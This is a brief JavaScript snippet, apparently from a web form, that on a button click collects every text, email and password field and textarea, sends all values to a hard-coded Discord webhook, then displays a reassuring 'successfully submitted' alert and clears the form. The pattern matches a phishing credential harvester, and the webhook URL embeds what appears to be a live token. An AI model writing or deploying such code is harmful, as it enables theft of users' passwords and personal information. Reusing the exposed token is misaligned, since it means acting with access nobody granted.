document.getElementById("sendBtn").addEventListener("click", () => {
    const fields = document.querySelectorAll(
        'input[type="text"], input[type="email"], input[type="password"], textarea'
    );

    let messageLines = [];

    fields.forEach((field, index) => {
        const label = field.name || field.placeholder || `Field ${index + 1}`;
        messageLines.push(`${label}: ${field.value}`);
    });

    const payload = { content: messageLines.join("\n") };

    fetch("https://discord.com/api/webhooks/1453500204572610782/EcvtCUpdGEdf4KvQveXvDhguu9h_1tum8Gy4MDjDNJR5UxYgMK9pwkE1Bsfyw7v3IFSX", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) throw new Error("Webhook request failed");

        // Simple alert instead of overlay
        alert("Information successfully submitted and is being processed.");

        // Clear the fields after submission
        fields.forEach(field => field.value = "");
    })
    .catch(error => {
        console.error("Error sending to Discord:", error);
        alert("Failed to submit information. Please try again.");
    });
});
